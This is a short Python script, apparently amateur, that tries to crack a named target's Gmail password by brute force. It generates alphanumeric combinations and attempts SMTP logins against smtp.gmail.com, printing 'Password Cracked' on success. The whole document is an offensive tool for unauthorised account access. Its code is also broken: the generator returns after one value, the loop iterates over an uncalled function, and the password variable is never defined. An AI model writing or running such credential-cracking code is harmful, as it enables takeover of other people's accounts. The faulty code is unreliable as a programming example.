import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
i = 0
user = input("Enter Target's Gmail Address: ")
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n): 
        

                return ''.join(perm)
                



for symbols in print_perms:


       try:
           smtpserver.login(user, password)

           print("[+] Password Cracked: %s") % symbols
           break
       except smtplib.SMTPAuthenticationError:
           print("[!] Password Inccorect: %s") % symbols



